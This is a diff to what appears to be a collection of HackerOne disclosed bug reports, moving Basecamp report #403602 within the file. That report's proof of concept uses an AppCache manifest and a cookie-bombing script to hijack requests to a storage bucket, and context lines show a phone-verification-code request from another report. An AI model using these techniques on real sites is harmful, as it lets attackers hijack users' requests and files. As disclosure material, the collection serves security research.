@@ -1037,6 +1037,35 @@ Example payload:
 }
 ```
 
+## #403602 Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket) — basecamp — - — Business Logic Errors
+Source: `hackerone/reports/2020/403602.md` (https://hackerone.com/reports/403602)
+
+```
+<html manifest="[manifest_url]">
+This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
+<script>
+setTimeout(function(){
+for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
+}, 3000);
+</script>
+</html>
+```
+
+```
+CACHE MANIFEST 
+
+FALLBACK:
+/bc3_production_blobs/ [fallback_url]
+```
+
+```
+<html>
+<script>
+alert('Your request to the page '+location.href+' is hijacked!');
+</script>
+</html>
+```
+
 ## #1991376 the domain is truck-admin.eu-east-1.indriverapp.com and Enter the management system of the blasting mobile phone verification code — indrive — - — Business Logic Errors
 Source: `hackerone/reports/2023/1991376.md` (https://hackerone.com/reports/1991376)
 
@@ -1083,35 +1112,6 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 
 {"phone":"██████","code":"1234"}
-```
-
-## #403602 Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket) — basecamp — - — Business Logic Errors
-Source: `hackerone/reports/2020/403602.md` (https://hackerone.com/reports/403602)
-
-```
-<html manifest="[manifest_url]">
-This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
-<script>
-setTimeout(function(){
-for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
-}, 3000);
-</script>
-</html>
-```
-
-```
-CACHE MANIFEST 
-
-FALLBACK:
-/bc3_production_blobs/ [fallback_url]
-```
-
-```
-<html>
-<script>
-alert('Your request to the page '+location.href+' is hijacked!');
-</script>
-</html>
 ```
 
 ## #637267 Payment method token being sent to 3rd party analytics service — upserve — - — Business Logic Errors
